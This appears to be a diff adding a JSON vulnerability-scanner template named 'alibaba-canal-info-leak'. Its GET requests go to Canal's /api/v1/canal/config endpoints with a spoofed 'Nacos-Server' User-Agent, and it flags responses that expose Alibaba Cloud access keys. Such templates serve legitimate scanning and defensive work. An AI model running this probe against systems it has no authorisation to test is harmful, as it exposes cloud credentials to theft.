@@ -1,0 +1,57 @@
+{
+    "Name": "alibaba-canal-info-leak",
+    "Description": "alibaba-canal-info-leak",
+    "Product": "Alibaba",
+    "author": "chumeng",
+    "Request":[
+        {
+        "Method": "GET",
+        "Header": {"User-Agent": "Nacos-Server"},
+        "Uri":"/api/v1/canal/config/1/0",
+        "Port":"",
+        "Data":"",
+        "Follow_redirects":"false",
+        "Upload":{"Name": "","fileName": "","filePath": "" },
+        "Response":{
+        "Check_Steps":"AND",
+        "Checks": [
+                {
+                "Operation": "contains", 
+                "Key":"",
+                "Value": "ncanal.aliyun.accessKey"
+                },
+                 {
+                "Operation": "code", 
+                "Key":"",
+                "Value": "200"  
+                 }
+        ]
+        },
+        "Next_decide":"OR"
+                }, {
+                    "Method": "GET",
+                    "Header": {"User-Agent": "Nacos-Server"},
+                    "Uri":"/api/v1/canal/config/1/1",
+                    "Port":"",
+                    "Data":"",
+                    "Follow_redirects":"false",
+                    "Upload":{"Name": "","fileName": "","filePath": "" },
+                    "Response":{
+                    "Check_Steps":"AND",
+                    "Checks": [
+                            {
+                            "Operation": "contains", 
+                            "Key":"",
+                            "Value": "ncanal.aliyun.accessKey"
+                            },
+                             {
+                            "Operation": "code", 
+                            "Key":"",
+                            "Value": "200"  
+                             }
+                    ]
+                    },
+                    "Next_decide":""
+                            }
+]}
+
